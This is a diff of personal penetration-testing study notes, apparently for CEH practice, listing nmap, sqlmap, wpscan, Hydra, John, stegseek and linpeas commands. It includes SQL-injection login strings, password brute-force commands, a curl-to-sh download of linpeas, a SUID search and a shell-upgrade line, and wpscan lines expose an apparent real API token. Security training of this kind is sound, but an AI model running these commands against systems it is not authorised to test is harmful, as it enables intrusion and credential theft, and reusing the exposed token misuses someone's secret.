@@ -20,12 +20,10 @@ sudo gem install wpscan
 sudo nmap -O -T5 -sV -sC -oA nmap_$ip1_out_all -vv $ip1/24
 sudo xsltproc nmap_out_all.xml nmap_$ip1_out_all.html
 
-cd CEH;mkdir $ip;cd $ip;sudo nmap -O -T5 -sV -sC -oA nmap_$ip\_out -vv $ip/24;sudo xsltproc nmap_$ip\_out.xml -o nmap_$ip\_out.html;
+cd CEH;mkdir $ip;cd $ip;sudo nmap -O -T5 -sV -sC -oA nmap_$ip\_out -vv $ip/24;sudo xsltproc nmap_$ip\_out.xml -o nmap_$ip\_out.html;firefox nmap_$ip\_out.html;
 
 ### All ports
 sudo nmap -O -T5 -sV -sC -p- -oA nmap_$ip\\_out_all -vv $ip/24;sudo xsltproc nmap_$ip\\_out_all.xml -o nmap_$ip\\_out_all.html;
-
-
 
 ### Quick Host Discovery
 sudo nmap -O -T5 -sn $ip/24 
@@ -51,8 +49,19 @@ admin'/*
 
 sqlmap -u “url" --cookie="cookie" --dbs
 
+## Burpsuite
+FoxyProxy in firefox
+https://jaimelightfoot.com/blog/burp-suite-for-beginners-setup-and-target-proxy-tools/
 
-##Steganography
+## Crypto:
+https://www.tunnelsup.com/hash-analyzer/
+https://crackstation.net/
+https://medium.com/@FLAME93/introduction-b83f46c44c9a
+Hashcat
+https://github.com/unstable-deadlock/brashendeavours.gitbook.io/blob/master/pentesting-cheatsheets/hashcat-hash-modes.md
+
+
+## Steganography
 sudo stegseek -wl /usr/share/wordlists/rockyou.txt -sf filename
 
 snow.exe -C -p “password” stegfile.txt
@@ -68,15 +77,26 @@ wpscan -e vp,u,t --plugins-detection mixed --api-token j6ytwWSsVejE1kASMPSx2TOrL
 wpscan -e ap,u,t --plugins-detection mixed --api-token j6ytwWSsVejE1kASMPSx2TOrLuSzLPiAlc25i6ndJgQ --url <example.com>
 ### Password Bruteforce
 wpscan -e u --passwords /path/to/password_file.txt  --url <example.com>
-##Linpeas Winpeas also exists apparently
+## Linpeas Winpeas also exists apparently
 curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ./linpeas.sh -a > /tmp/linpeas.txt
 
-## Hydra
+## BRUTEFORCING
+### Hydra
 hydra -l <username> -P given_wordlist ftp://$ip
 https://github.com/frizb/Hydra-Cheatsheet
 
-## Find Domain Controller
+### John:
+Zip file:
+Zip2john file > hash.txt
+John hash.txt
+
+## Web App Vuln:
+Nikto
+Vega
+
+## AD Stuff
+### Find Domain Controller
 https://serverfault.com/questions/78089/find-name-of-active-directory-domain-controller
 ### Find FDQN
 https://www.google.com/search?q=determine+FDQN+of+remote+domain+controller&client=firefox-b-d&sca_esv=a7c8b91352f94de3&sxsrf=ADLYWIKttXggW1UFvbeJvw7jxaG1ZFa0Qg%3A1732694251615&ei=69BGZ8inJcmO4-EP0t3G8Qo&ved=0ahUKEwiIyfyKhfyJAxVJxzgGHdKuMa4Q4dUDCA8&uact=5&oq=determine+FDQN+of+remote+domain+controller&gs_lp=Egxnd3Mtd2l6LXNlcnAiKmRldGVybWluZSBGRFFOIG9mIHJlbW90ZSBkb21haW4gY29udHJvbGxlcjIKECEYoAEYwwQYCjIKECEYoAEYwwQYCjIKECEYoAEYwwQYCkjbEFCvBVj9CnABeAGQAQCYAb0CoAHXCqoBBzAuNi4wLjG4AQPIAQD4AQGYAgKgApwBwgIKEAAYsAMY1gQYR5gDAOIDBRIBMSBAiAYBkAYIkgcDMS4xoAfbOA&sclient=gws-wiz-serp
@@ -91,6 +111,7 @@ Entry point for ELF: readelf -a executable_name
 UNIX command exploits: GTFOBins
 CEH exercise: https://github.com/3ls3if/Cybersecurity-Notes/blob/main/ethical-hacking-and-pen-testing-notes/ceh-mindmaps/system-hacking/tasks.md
 
+Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2.
 
 Check all suid bit programs (find / -perm -u=s -type f 2>/dev/null)
 python -c import pty;pty.spawn("/bin/bash")
